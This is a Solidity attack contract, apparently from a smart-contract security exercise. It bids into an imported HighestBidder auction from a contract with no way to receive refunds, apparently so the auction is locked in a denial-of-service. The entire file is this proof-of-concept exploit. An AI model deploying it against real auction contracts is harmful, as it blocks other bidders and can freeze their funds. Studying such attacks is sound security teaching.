// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "./HighestBidder.sol";

contract Attack {
    HighestBidder highestBidder;

    constructor(address _highestBidder) {
        highestBidder = HighestBidder(_highestBidder);
    }

    function attack() public payable {
        highestBidder.setCurrentAuctionPrice{value: msg.value}();
    }
}
